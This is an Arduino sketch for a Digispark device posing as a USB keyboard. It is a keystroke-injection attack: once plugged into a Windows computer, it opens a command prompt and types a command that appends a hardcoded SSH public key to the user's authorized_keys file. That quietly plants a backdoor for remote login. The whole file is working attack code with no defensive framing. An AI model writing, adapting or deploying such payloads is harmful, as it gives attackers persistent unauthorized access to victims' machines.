#include "DigiKeyboard.h"
void setup() {
  pinMode(1, OUTPUT);
}
void loop() {
  DigiKeyboard.sendKeyStroke(0);
  
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  
  DigiKeyboard.print("echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMZgh/Qn023W9k3v6ROYHn1AbgJM8u7RntJXxUvEZKMI owo>> .ssh\\authorized_keys");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
    
  for(;;){
    digitalWrite(1, HIGH);
    delay(500);
    digitalWrite(1, LOW);
    delay(500);
  }
}
